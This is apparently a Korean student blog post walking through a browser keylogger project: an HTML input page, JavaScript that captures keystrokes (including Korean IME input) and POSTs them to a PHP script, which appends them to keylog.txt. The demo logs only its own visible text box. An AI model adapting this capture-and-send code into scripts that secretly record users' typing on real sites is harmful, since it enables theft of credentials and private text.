

layout: single
title:  "4주차 키로거 만들기"
categories: project
typora-root-url: ..\
author_profile: false

<br>

# <span style="background:#000000; color:#ffffff">1.키로거 만들기</span>

<br>

키로거란? 사용자가 작성하는 글을 기록하고 전송하는 것을 말합니다. 즉 사용자의 입력의 데이터를 가져오는 것입니다.

키로거를 만든 것을 보여드리면서 코드를 설명하겠습니다.

<img src="/images/2024-05-14-3/image-20240514033456490.png" alt="image-20240514033456490" style="display:flex; zoom: 50%; justify-content:left;" /><img src="/images/2024-05-14-3/image-20240514034539596.png" alt="image-20240514034539596" style="zoom:50%;justify-content:center; display:flex;" />

▶ 글을 작성하니, 작성한 글이 txt파일에 저장되는 모습!

## 1.1 keylog.html

<br>

저는  기본적으로 작성할 텍스트 박스를 만들었고, 텍스트의 내용을 밑에 표시하고 싶었기 때문에 pre를 작성해두었습니다.

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>keylogger</title>
</head>
<body>
    <h1>keylogger</h1>
    <input type="text" id="input" placeholder="입력할 글자를 넣어주세요">
    <pre id="log"></pre>
</body>
<script src="keylogger.js"></script>
</html>
```



## 1.2 keylogger.js

<br>▶<span style='font-weight:bold; font-size:20px'>DOM으로 구성 및 변수지정</span>

```javascript
document.addEventListener('DOMContentLoaded', () => {
    const input = document.getElementById('input');
    const log = document.getElementById('log');
    let composing = false; // IME 입력 중인지 나타내는 플래그
    let buffer = ''; // 입력 데이터를 임시 저장하는 버퍼
    let timeoutId = null; // 디바운싱을 위한 타임아웃 ID
```



▶<span style='font-weight:bold; font-size:20px'>IME 입력으로 한글적기 및 밑에 텍스트 내용 표시하기</span>

```javascript
    input.addEventListener('compositionstart', () => {
        composing = true;
    });

    input.addEventListener('compositionend', (event) => {
        composing = false;
        buffer += event.data || '';
        log.textContent += event.data || '';
        sendData(buffer); // 버퍼에 저장된 텍스트를 서버로 전송
        buffer = ''; // 버퍼 초기화
    });

    input.addEventListener('input', (event) => {
        if (!composing) {
            if (event.inputType === "deleteContentBackward") {
                log.textContent = log.textContent.slice(0, -1); // 마지막 문자 삭제
            } else {
                log.textContent += event.data || ''; // 새로운 입력 데이터 추가
            }
            debounceSendData(log.textContent); // 디바운싱을 적용하여 서버에 전송
        }
    });

```



▶<span style='font-weight:bold; font-size:20px'>데이터 전송하기 및 서버 응답 상태 확인하기</span>

```javascript

    function debounceSendData(text) {
        clearTimeout(timeoutId); // 이전 디바운스 대기중인 타이머가 있다면 취소
        timeoutId = setTimeout(() => {
            sendData(text); // 설정된 딜레이 후에 데이터 전송
        }, 2000); // 딜레이 시간은 500ms
    }

    function sendData(text) {
        var data = new FormData();
        data.append("keys", text);

        var xhr = new XMLHttpRequest();
        xhr.open("POST", "keylog.php", true);
        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded; charset=UTF-8');

        xhr.onload = function() {
            if (xhr.status === 200) {
                console.log('Data sent successfully:', xhr.responseText);
            } else {
                console.log('Failed to send data:', xhr.status);
            }
        };

        xhr.send(`keys=${encodeURIComponent(text)}`); // 데이터 인코딩하여 전송
    }
});

```



## 1.3 keylog.php

<br>

▶<span style='font-weight:bold; font-size:20px'>데이터 txt 파일로 보내기</span>

```php
<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $keys = $_POST['keys'] ?? '';
    file_put_contents("keylog.txt", $keys . PHP_EOL, FILE_APPEND | LOCK_EX);
}
```





